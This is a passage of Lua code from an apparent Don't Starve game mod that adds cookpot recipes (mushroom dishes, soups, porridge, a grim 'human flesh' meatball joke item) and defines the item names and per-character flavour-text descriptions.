		name = "sweet_n_sour",
		test = function(cooker, names, tags) return tags.meat and tags.meat >= 1 and (names.limon or names.limon_cooked or names.durian or names.durian_cooked) and tags.sweetener and tags.sweetener >= 1 and not tags.inedible end,
		priority = 6,
		weight = 1,
		foodtype = "MEAT",
		health = TUNING.HEALING_MEDSMALL*2,	-- 16
		hunger = TUNING.CALORIES_HUGE,		-- 75
		perishtime = TUNING.PERISH_MED,		-- 10
		sanity = TUNING.SANITY_SMALL,		-- 10
		cooktime = 1.5,
		tags = {"honeyed"}
	}
AddCookerRecipe("cookpot", sweet_n_sour_recipe)


-- MUSHROOM RECIPEs	=======================================================================

	local mushroom_burger_recipe = {
		name = "mushroom_burger",
		test = function(cooker, names, tags) return tags.mushrooms and tags.mushrooms >1 and tags.meat and tags.meat <= 1 and not tags.fruit and not tags.inedible end,
		priority = 8,
		weight = 1,
		foodtype = "MEAT",
		health = TUNING.HEALING_MEDSMALL*2,	-- 16
		hunger = TUNING.CALORIES_LARGE,		-- 37.5
		perishtime = TUNING.PERISH_MED,		-- 10
		sanity = TUNING.SANITY_TINY,		-- 5
		cooktime = 1,
	}
AddCookerRecipe("cookpot", mushroom_burger_recipe)	

local mushroom_malody_recipe = {	
		name = "mushroom_malody",
		test = function(cooker, names, tags) return tags.fungus and tags.fungus >=2 and not names.dragonfruit end,
		priority = 6,
		weight = 1,
		foodtype = "VEGGIE",
		health = -TUNING.HEALING_SMALL,		-- (-3)
		hunger = TUNING.CALORIES_SMALL,		-- 12.5
		perishtime = TUNING.PERISH_MED,		-- 10
		sanity = -TUNING.SANITY_MEDLARGE,	-- (-20)
		cooktime = 1,
	}
AddCookerRecipe("cookpot", mushroom_malody_recipe)
	
local mushroom_medley_recipe = {	
		name = "mushroom_medley",
		test = function(cooker, names, tags) return (names.blue_cap or names.blue_cap_cooked) and (names.green_cap or names.green_cap_cooked) and (names.red_cap or names.red_cap_cooked) and not tags.fruit and not tags.meat end,
		priority = 9,
		weight = 1,
		foodtype = "VEGGIE",
		health = TUNING.HEALING_MEDLARGE,	-- 30
		hunger = TUNING.CALORIES_LARGE,		-- 37.5
		perishtime = TUNING.PERISH_ONE_DAY,	-- 1
		sanity = TUNING.SANITY_LARGE,		-- 33
		cooktime = 1,
	}
AddCookerRecipe("cookpot", mushroom_medley_recipe)

local mushroom_stew_recipe = {	
		name = "mushroom_stew",
		test = function(cooker, names, tags) return tags.fungus and tags.dairy and tags.dairy >= 1 and not tags.meat and not tags.fruit and not tags.inedible end,
		priority = 4,
		weight = 1,
		foodtype = "VEGGIE",
		health = TUNING.HEALING_MEDSMALL,	-- 8
		hunger = TUNING.CALORIES_LARGE,		-- 37.5
		perishtime = TUNING.PERISH_SUPERFAST*2.5,	-- 7.5
		sanity = TUNING.SANITY_MED,			-- 15
		cooktime = 0.75,
	}
AddCookerRecipe("cookpot", mushroom_stew_recipe)

-- PASTA RECIPEs	=======================================================================

-- SALAD RECIPEs	=======================================================================

-- SOUP RECIPEs	===========================================================================

local cactus_soup_recipe = {		
		name = "cactus_soup",
		test = function(cooker, names, tags) return tags.cactus and tags.cactus >=1 and tags.meat and tags.meat >=1 and not tags.dairy and not tags.sweetener and not tags.fruit and not tags.inedible end,
		priority = 4,
		weight = 1,
		foodtype = "MEAT",
		health = TUNING.HEALING_MED,		-- 20
		hunger = TUNING.CALORIES_MEDSMALL*3,	-- 56.25
		perishtime = TUNING.PERISH_FAST,	-- 6
		sanity = TUNING.SANITY_MEDLARGE,	-- 20
		cooktime = 0.75,
	}
AddCookerRecipe("cookpot", cactus_soup_recipe) -- requires cactus

local chowder_recipe = {	
		name = "chowder",
		test = function(cooker, names, tags) return tags.seafood and tags.dairy and tags.veggie and not tags.fungus and not tags.fruit and not tags.inedible end,
		priority = 4,
		weight = 1,
		foodtype = "MEAT",
		health = TUNING.HEALING_MED,		-- 20
		hunger = TUNING.CALORIES_LARGE,		-- 37.5
		perishtime = TUNING.PERISH_FAST,	-- 6
		sanity = TUNING.SANITY_SMALL,		-- 10
		cooktime = 1,
	}
AddCookerRecipe("cookpot", chowder_recipe)

local gumbo_recipe = {	
		name = "gumbo",
		test = function(cooker, names, tags) return tags.seafood and tags.fungus and tags.veggie and tags.veggie >= 1.5 and not tags.fruit and not tags.dairy and not tags.inedible end,
		priority = 4,
		weight = 1,
		foodtype = "MEAT",
		health = TUNING.HEALING_MEDSMALL*2,	-- 16
		hunger = TUNING.CALORIES_LARGE,		-- 37.5
		perishtime = TUNING.PERISH_FAST*1.35,	-- 8.1
		sanity = TUNING.SANITY_TINY,		-- 5
		cooktime = 1,
	}
AddCookerRecipe("cookpot", gumbo_recipe)	

local squash_recipe = {		
		name = "squash",
		test = function(cooker, names, tags) return tags.nut and tags.nut>=1 and (names.pumpkin or names.pumpkin_cooked) and tags.fat and not tags.egg and not tags.meat and not tags.inedible end,
		priority = 4,
		weight = 1,
		foodtype = "VEGGIE",
		health = TUNING.HEALING_LARGE,		-- 40
		hunger = TUNING.CALORIES_HUGE,		-- 75
		perishtime = TUNING.PERISH_FAST,	-- 6
		sanity = TUNING.SANITY_MED,			-- 15
		cooktime = 0.75,
	}
AddCookerRecipe("cookpot", squash_recipe) -- requires nut


-- MISCELANEOUS RECIPEs	===================================================================

local cheese_log_recipe = {	
		name = "cheese_log",
		test = function(cooker, names, tags) return tags.dairy and tags.seed and tags.seed >=1 and (not tags.inedible or tags.inedible <=1) and not tags.meat and not tags.fruit and not names.butter and not names.oleo end,
		priority = 9,
		weight = 1,
		foodtype = "GENERIC",
		health = TUNING.HEALING_SMALL,		-- 3
		hunger = TUNING.CALORIES_LARGE,		-- 37.5
		perishtime = TUNING.PERISH_MED,		-- 10
		sanity = TUNING.SANITY_SMALL,		-- 10
		cooktime = 3,
	}
AddCookerRecipe("cookpot", cheese_log_recipe) -- requires milk/dairy



local meatballs_human_recipe = {	
		name = "meatballs_human",
		test = function(cooker, names, tags) return tags.humanmeat and not tags.sweetener and not tags.inedible end,
		priority = -0.5,
		weight = 1,
		foodtype = "MEAT",
		health = TUNING.HEALING_SMALL,		--как тефтели
		hunger = TUNING.CALORIES_SMALL*5,		
		perishtime = TUNING.PERISH_MED,		
		sanity = -TUNING.SANITY_TINY,		
		cooktime = 3,
	}
AddCookerRecipe("cookpot", meatballs_human_recipe) -- requires milk/dairy


local nut_butter_recipe = {		
		name = "nut_butter",
		test = function(cooker, names, tags) return tags.nut and tags.fat and tags.fat >= 1 and tags.sweetener and tags.sweetener >= 1 and not tags.meat and not tags.veggie end,
		priority = 9,
		weight = 1,
		foodtype = "GENERIC",
		health = TUNING.HEALING_MEDLARGE,	-- 30
		hunger = TUNING.CALORIES_HUGE*0.6,	-- 45
		perishtime = TUNING.PERISH_PRESERVED,	-- 20
		sanity = TUNING.SANITY_MED,			-- 15
		cooktime = 1,
		tags = {"honeyed"}
	}
AddCookerRecipe("cookpot", nut_butter_recipe) -- requires nut

local oleo_recipe = {		
		name = "oleo",
		test = function(cooker, names, tags) return names.corn and names.butterflywings and names.butterflywings >1 and names.twigs end,
		priority = 9,
		weight = 1,
		foodtype = "GENERIC",
		health = TUNING.HEALING_MEDSMALL*3,	-- 24
		hunger = TUNING.CALORIES_MED,		-- 25
		perishtime = TUNING.PERISH_SLOW,	-- 15
		sanity = TUNING.SANITY_TINY,		-- 5
		cooktime = 2.5,
	}
AddCookerRecipe("cookpot", oleo_recipe)

local porridge_recipe = {		
		name = "porridge",
		test = function(cooker, names, tags) return tags.seed and tags.seed >= 1 and tags.seed <2 and not tags.nut and not names.dragonfruit and not names.dragontfruit_cooked and not tags.inedible end,
		priority = 6,
		weight = 1,
		foodtype = "GENERIC",
		health = TUNING.HEALING_SMALL,		-- 3 / gruel 0
		hunger = TUNING.CALORIES_MED,		-- 25 / gruel 18.75
		perishtime = TUNING.PERISH_SUPERFAST,	-- 3 / 6
		sanity = TUNING.SANITY_SMALL,		-- 10 / gruel -10
		cooktime = 0.5,
	}
AddCookerRecipe("cookpot", porridge_recipe)

-- NAMES
GLOBAL.STRINGS.NAMES.ACK_MUFFIN = "A Convenient Muffin"
	-- Cakes & Pies
GLOBAL.STRINGS.NAMES.CACTUS_CAKE = "Cactus Cake" -- requires cactus
GLOBAL.STRINGS.NAMES.MERINGUE = "Meringue Pie"
GLOBAL.STRINGS.NAMES.NANA_BREAD = "Banana Bread"
GLOBAL.STRINGS.NAMES.STICKY_BUN = "Sticky Bun" -- Honeyed
		-- Candies & Sugars
GLOBAL.STRINGS.NAMES.CANDIED_FRUIT = "Candied Fruit" -- Honeyed
GLOBAL.STRINGS.NAMES.CANDIED_NUT = "Sugared Nuts" -- Honeyed
GLOBAL.STRINGS.NAMES.FRUIT_SYRUP = "Fruity Syrup" -- Ingredient:Sweetener, Honeyed
GLOBAL.STRINGS.NAMES.MOLASSES = "Molasses" -- Ingredient:Sweetener, Honeyed 
GLOBAL.STRINGS.NAMES.MUSH_MELON = "Mushmelons" -- Honeyed
GLOBAL.STRINGS.NAMES.MUSH_MELON_COOKED = "Toasted Mushmelons" -- Honeyed
	-- Eggs
GLOBAL.STRINGS.NAMES.OMELETTE = "Fluffy Omelette"
GLOBAL.STRINGS.NAMES.MUSHY_EGGS = "Mushy Eggs"
GLOBAL.STRINGS.NAMES.NOPALITO = "Nopalitos con Huevos" -- requires cactus
	-- Fruits
GLOBAL.STRINGS.NAMES.FRUIT_LEATHER = "Fruit Leather" -- COLD
GLOBAL.STRINGS.NAMES.FRUIT_TRUFFLE = "Fruit Truffle" -- COLD, requires dairy (not butter/oleo)
GLOBAL.STRINGS.NAMES.LIMONADE = "Limonade" -- COLD
GLOBAL.STRINGS.NAMES.LIMONGELO = "Gelatin"
	-- Meats
GLOBAL.STRINGS.NAMES.BEEFALO_WINGS = "Beefalo Wings" -- HOT
GLOBAL.STRINGS.NAMES.CASSEROLE = "Leftover Casserole" -- COLD
GLOBAL.STRINGS.NAMES.COLDCUTS = "Coldcuts" -- COLD
GLOBAL.STRINGS.NAMES.SAUSAGE_GRAVY = "Sausage and Gravy"
GLOBAL.STRINGS.NAMES.SURF_N_TURF = "Surf and Turf Platter"
GLOBAL.STRINGS.NAMES.SWEET_N_SOUR = "Sweet and Sour Pork"
	-- Mushrooms
GLOBAL.STRINGS.NAMES.MUSHROOM_BURGER = "Mushroom Burger"
GLOBAL.STRINGS.NAMES.MUSHROOM_MALODY = "Mushroom Malody"
GLOBAL.STRINGS.NAMES.MUSHROOM_MEDLEY = "Mushroom Medley"
GLOBAL.STRINGS.NAMES.MUSHROOM_STEW = "Mushroom Stew"
	-- Pastas

	-- Salads

	-- Soups
GLOBAL.STRINGS.NAMES.CACTUS_SOUP = "Cactus Soup" -- requires cactus
GLOBAL.STRINGS.NAMES.CHOWDER = "Seafood Chowder"
GLOBAL.STRINGS.NAMES.GUMBO = "Spicy Gumbo" -- HOT
GLOBAL.STRINGS.NAMES.SQUASH = "Butternut Squash Soup" -- requires nut
	-- Miscelaneous
GLOBAL.STRINGS.NAMES.CHEESE_LOG = "Nutty Cheese Log." -- requires dairy (not butter/oleo)
GLOBAL.STRINGS.NAMES.MEATBALLS_HUMAN = "Croquettes of human flesh"
GLOBAL.STRINGS.NAMES.GRUEL = "Leftover Gruel"
GLOBAL.STRINGS.NAMES.NUT_BUTTER = "Birchnut Butter" -- requires nut
GLOBAL.STRINGS.NAMES.OLEO = "Oleo" -- Ingredient:Dairy, Ingredient:Fat
GLOBAL.STRINGS.NAMES.PORRIDGE = "Porridge"
	-- Crops & Seeds
GLOBAL.STRINGS.NAMES.GRAPRICOT = "Grapricots"
GLOBAL.STRINGS.NAMES.GRAPRICOT_COOKED = "Baked Grapricots"
GLOBAL.STRINGS.NAMES.GRAPRICOT_SEEDS = "Grapricot Seeds"
GLOBAL.STRINGS.NAMES.LIMON = "Limons"
GLOBAL.STRINGS.NAMES.LIMON_COOKED = "Roasted Limon"
GLOBAL.STRINGS.NAMES.LIMON_SEEDS = "Limon Seeds"
GLOBAL.STRINGS.NAMES.TOMANGO = "Tomango"
GLOBAL.STRINGS.NAMES.TOMANGO_COOKED = "Fried Tomango"
GLOBAL.STRINGS.NAMES.TOMANGO_SEEDS = "Tomango Seeds"
	

-- DESCRIPTIONS.GENERIC		
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.ACK_MUFFIN = "A Muffin MacGuffin."
	-- Cakes & Pies
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.CACTUS_CAKE = "Sweet and spiny."			
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.MERINGUE = "It looks delicious."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.NANA_BREAD = "Much tastier than fruit cake."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.STICKY_BUN = "With extra stickiness."
	-- Candies & Sugars
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.CANDIED_FRUIT = "Honey coated and sickly sweet."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.CANDIED_NUT = "They are coated with crystallized honey."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.FRUIT_SYRUP = "High fructose syrup."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.MOLASSES = "A sweet end for a mole."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.MUSH_MELON = "Not quite the way I remember them."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.MUSH_MELON_COOKED = "I want some more."
	-- Eggs
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.OMELETTE = "The result of breaking a few eggs."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.MUSHY_EGGS = "Edible eggs."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.NOPALITO = "A tasty but prickly pair."
	-- Fruits
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.FRUIT_LEATHER = "Dried fruity strips."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.FRUIT_TRUFFLE = "A trifling dessert"
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.LIMONADE = "A cold and sweetly tart drink."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.LIMONGELO = "There's always room for fruity gelatin."
	-- Meats
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.BEEFALO_WINGS = "Super hot and spicy."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.CASSEROLE = "Leftovers again."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.COLDCUTS = "Chilled to perfection."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.SAUSAGE_GRAVY = "Greasy sausage in fatty gravy."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.SURF_N_TURF = "A tasty duo of flavors."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.SWEET_N_SOUR = "It makes me feel Hunan again."
	-- Mushrooms
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.MUSHROOM_BURGER = "Hot meat served between mushroom caps."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.MUSHROOM_MALODY = "It smells like rot."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.MUSHROOM_MEDLEY = "A enticing array of colorful fungus."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.MUSHROOM_STEW = "A creamy mushroom soup."
	-- Pastas
	-- Salads
	-- Soups
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.CACTUS_SOUP = "A barrel of flavor."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.CHOWDER = "Thick and creamy."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.GUMBO = "An extra spicy taste treat."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.SQUASH = "Pureed to perfection."
	-- Miscelaneous
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.CHEESE_LOG = "More edible than the wooden ones."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.MEATBALLS_HUMAN = "Omg omg..."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.GRUEL = "An imperfect hominy of bland flavors."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.NUT_BUTTER = "The pinnacle of dietary science."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.OLEO = "Not bad, but I've tasted butter."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.PORRIDGE = "A perfect hominy of bland flavors."
	-- Crops & Seeds
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.GRAPRICOT = "The fruit of the vine."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.GRAPRICOT_COOKED = "Delicious and sweet."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.GRAPRICOT_SEEDS = "These seeds are the pits."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.LIMON = "A tart citrus fruit."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.LIMON_COOKED = "Not quite as appealing now."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.LIMON_SEEDS = "These will grow a rare citrus vine."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.TOMANGO = "Some people debate if this is a fruit or a vegetable."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.TOMANGO_COOKED = "Some prefer to cook them while they are still green."
GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.TOMANGO_SEEDS = "Is this a fruit seed or a vegetable seed?"
	

-- DESCRIPTIONS.WX78
	-- Cakes & Pies
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.CACTUS_CAKE = "LET THEM EAT CAKE"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.NANA_BREAD = "FOOD INSIDE OF FOOD"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.STICKY_BUN = "EXTRA STICKINESS DETECTED"
	-- Candies & Sugars
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.CANDIED_FRUIT = "GLUCOSE SATURATED FRUCTOSE"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.CANDIED_NUT = "A SWEET TASTE OF DEAD PLANTS"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.MOLASSES = "SWEETLY SUSPECT METHODOLOGY"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.MUSH_MELON = "NEITHER MUSH NOR MELON"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.MUSH_MELON_COOKED = "NEITHER MUSH, NOR MELON, NOR TOAST"
	-- Eggs
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.OMELETTE = "I HAVE BEATEN THE EGG"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.MUSHY_EGGS = "THIS IS EVEN LESS IMPROVED"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.NOPALITO = "UPGRADED DESERT NUTRIENTS"
	-- Fruits
--GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.LIMONADE = "FRUIT DRINK DESIGNATE: dn-L"
	-- Meats
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.BEEFALO_WINGS = "BEEFALO HAVE WINGS?"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.COLDCUTS = "MEAT ON ICE"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.SAUSAGE_GRAVY = "EXTRA FAT = EXTRA FLAVOR"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.SURF_N_TURF = "MEAT FROM TWO BIOMES ADDED TOGETHER"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.SWEET_N_SOUR = "STICKY SWEET COATING"
	-- Mushrooms
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.MUSHROOM_BURGER = "MUSHROOM / MEAT / MUSHROOM"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.MUSHROOM_MALODY = "NOXIOUS FUNGUS"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.MUSHROOM_MEDLEY = "OPTIMIZED FUNGUS"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.MUSHROOM_STEW = "DAIRY BASED FUNGAL SOUP"
	-- Pastas
	-- Salads
	-- Soups
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.CACTUS_SOUP = "BARRIER TO NUTRIENTS HAS BEEN BLANCHED"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.CHOWDER = "THEY SWIM BETTER IN WATER"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.GUMBO = "LEFTOVERS = STEW"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.SQUASH = "LIQUID GOURD"
	-- Miscelaneous
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.CHEESE_LOG = "FERMENTED MAMMAL JUICE"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.MEATBALLS_HUMAN = "EXTRA HUMAN"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.GRUEL = "EXTRA MUSHY SEED CASINGS"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.NUT_BUTTER = "SWEETENED FAT INFUSED WITH NUT"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.OLEO = "IMITATION IMPROBABILITY"
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.PORRIDGE = "MUSHY SEED CASINGS"
	-- Crops & Seeds
GLOBAL.STRINGS.CHARACTERS.WX78.DESCRIBE.LIMON_COOOKED = "I DO NOT FEEL GOOD ABOUT IT"


-- DESCRIPTIONS.WOODIE
	-- Cakes & Pies
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.CACTUS_CAKE = "The most dangerous food is wedding cake."
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.NANA_BREAD = "Fruity bread!"
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.STICKY_BUN = "Sticks to your ribs, eh?"
	-- Candies & Sugars
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.CANDIED_FRUIT = "Syrupy fruit."
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.CANDIED_NUT = "Nutty sugar."
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.MOLASSES = "I prefer maple syrup."
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.MUSH_MELON = "Soft green snacks."
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.MUSH_MELON_COOKED = "Perfect for camping in the woods."
	-- Eggs
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.OMELETTE = "All fluffy, eh?"
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.MUSHY_EGGS = "Mushy is better than goopy."
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.NOPALITO = "A taste from south of the border, eh?"
	-- Fruits
	-- Meats
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.BEEFALO_WINGS = "Wings in hot sauce, eh?"
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.COLDCUTS = "It's just like lunch back home."
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.SAUSAGE_GRAVY = "Just like back at the lumber camp."
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.SURF_N_TURF = "Smells like moose-cod pie!"
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.SWEET_N_SOUR = "Tasty meat in sour syrup."
	-- Mushrooms
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.MUSHROOM_BURGER = "A hot mushroom sandwich, eh?"
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.MUSHROOM_MALODY = "Did I cook these right?"
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.MUSHROOM_MEDLEY = "All the mushrooms!"
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.MUSHROOM_STEW = "Stewed mushrooms."
	-- Pastas
	-- Salads
	-- Soups
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.CACTUS_SOUP = "It's a spiny stock."
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.CHOWDER = "It tastes all fishy now."
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.GUMBO = "How does soup make the food so hot?"
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.SQUASH = "Still not a pie."
	-- Miscelaneous
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.CHEESE_LOG = "I prefer chopping logs."
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.MEATBALLS_HUMAN = "I prefer just killing, not eating."
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.GRUEL = "It's not like breakfast back home."
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.NUT_BUTTER = "This is best kind of butter!"
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.OLEO = "Better than butter!"
GLOBAL.STRINGS.CHARACTERS.WOODIE.DESCRIBE.PORRIDGE = "It's just like breakfast back home."
	-- Crops & Seeds
	
	
-- DESCRIPTIONS.WILLOW
	-- Cakes & Pies
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.CACTUS_CAKE = "It needs burning candles."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.NANA_BREAD = "Even more yummy than before."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.STICKY_BUN = "It is honey glazed."
	-- Candies & Sugars
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.CANDIED_FRUIT = "It might be too sweet now."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.CANDIED_NUT = "Fire makes the honey harden."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.MOLASSES = "Disgusting, but even more tasty."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.MUSH_MELON = "They would be better toasted."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.MUSH_MELON_COOKED = "A tasty charred outer layer."
	-- Eggs
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.OMELETTE = "The yellow part is fluffy now."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.MUSHY_EGGS = "I don't like mushy."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.NOPALITO = "A warm blanket of cactus bathed in fire."
	-- Fruits
	-- Meats
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.BEEFALO_WINGS = "Meat treat heat."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.COLDCUTS = "Ugh. Food fixed without fire?"
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.SAUSAGE_GRAVY = "Delicious seasoned sausage and gravy."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.SURF_N_TURF = "Not bad, but cod be better."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.SWEET_N_SOUR = "I like the sweet."
	-- Mushrooms
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.MUSHROOM_BURGER = "No Ketchup?"
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.MUSHROOM_MALODY = "Fire made them worse?"
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.MUSHROOM_MEDLEY = "Fire made them better."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.MUSHROOM_STEW = "Mushrooms boiled in cream."
	-- Pastas
	-- Salads
	-- Soups
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.CACTUS_SOUP = "Flame kissed cactus puree."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.CHOWDER = "Cream of fish."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.GUMBO = "I love a hot soup."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.SQUASH = "Tasty and hot."
	-- Miscelaneous
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.CHEESE_LOG = "It doesn't burn like a real log."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.MEATBALLS_HUMAN = "He was burned by me."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.GRUEL = "It's colder and wetter and I hate it more."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.NUT_BUTTER = "Sweetened birchnut goop."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.OLEO = "Just like butter, but more corny."
GLOBAL.STRINGS.CHARACTERS.WILLOW.DESCRIBE.PORRIDGE = "It's cold and wet and I hate it."
	-- Crops & Seeds


-- DESCRIPTIONS.WOLFGANG
	-- Cakes & Pies
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.CACTUS_CAKE = "No ice cream?"
GLOBAL.STRINGS.CHARACTERS.WOLFGANG.DESCRIBE.NANA_BREAD = "Tasty fruit is put in bread."
